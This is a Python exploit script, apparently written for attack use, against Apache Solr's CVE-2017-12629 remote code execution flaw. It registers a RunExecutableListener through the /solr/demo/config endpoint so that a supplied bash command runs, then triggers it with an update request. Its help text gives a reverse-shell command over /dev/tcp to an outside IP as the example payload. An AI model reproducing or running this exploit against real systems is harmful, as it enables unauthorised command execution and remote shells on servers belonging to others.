# -*- coding:utf-8 -*-
# Author:g5z3r

import requests
import sys
import json
import random
import urllib3
import argparse

urllib3.disable_warnings()
def main():
    if sys.argv.__len__() <= 2:
        print("usage:python Solr_RCE_CVE-2017-12629 -u http://www.xxx.com -c \"ping xxxx.dnslog.cn\"")
        exit(0)
    else:
        parse = argparse.ArgumentParser()
        group = parse.add_mutually_exclusive_group()
        group.add_argument('-u',"--url",help='input target url,Example: http://192.168.1.1:8080')
        parse.add_argument('-c','--command',help='exec command,Example: bash -i >& /dev/tcp/192.168.64.1/3721 0>&1',required=True)
        # group.add_argument('-f','--file',help='url list,Example: urls.txt')
        args = parse.parse_args()

        if args.url[-1:] == "/":
            host = args.url[:-1]
        else:
            host = args.url
        cmd = args.command
    headers = {
        "Accept":"*/*",
        "Accept-Language":"English",
        "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        "Content-Type":"application/json",
        "Connection":"close"
    }
    data = {"add-listener":{"event":"postCommit","name":str(random.random()),"class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", cmd]}}
    proxies = {
        "http":"http://127.0.0.1:9090",
        "https":"http://127.0.0.1:9090"
    }
    url = "/solr/demo/config"
    # url = "/solr/config"
    response = requests.post(url=host+url,headers=headers,data=json.dumps(data),proxies=proxies)
    url = "/solr/demo/update"
    # url = "/solr/update"
    data = [
        {"id":"test"}
    ]
    response = requests.post(url=host+url,headers=headers,data=json.dumps(data),proxies=proxies)
    if "\"status\":0" in response.text:
        print("[+]host " + host + " is vulnable.")
    else:
        print("[-]host " + host + " is not vulnable.")

if __name__ == '__main__':
    main()

